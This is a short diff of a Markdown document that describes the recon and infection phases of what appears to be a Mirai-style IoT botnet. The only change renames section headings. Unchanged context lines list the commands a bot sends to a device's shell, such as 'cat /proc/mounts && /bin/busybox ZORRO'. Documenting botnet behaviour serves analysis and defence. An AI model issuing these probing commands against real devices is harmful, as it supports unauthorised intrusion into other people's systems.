@@ -1,4 +1,4 @@
-### Recon phase (sample)
+### Recon phase (example)
 ```
 enable
 shell
@@ -9,7 +9,7 @@ cat /proc/mounts && /bin/busybox ZORRO
 /bin/busybox cat /bin/sh
 ```
 
-### Infection phase (sample)
+### Infection phase (example)
 ```
 enable
 shell
